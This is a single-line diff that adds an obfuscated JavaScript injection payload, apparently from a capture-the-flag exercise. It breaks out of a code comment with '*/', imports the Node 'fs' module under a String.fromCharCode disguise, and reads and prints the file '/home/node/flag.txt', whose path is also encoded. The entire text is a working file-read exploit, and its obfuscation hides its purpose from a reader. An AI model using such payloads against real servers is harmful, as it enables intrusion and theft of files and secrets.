@@ -1,0 +1,1 @@
+*/,import(String.fromCharCode(102,115)).then((m)=>console.log(m.readFileSync(String.fromCharCode(47,104,111,109,101,47,110,111,100,101,47,102,108,97,103,46,116,120,116),String.fromCharCode(117,116,102,45,56))))/*
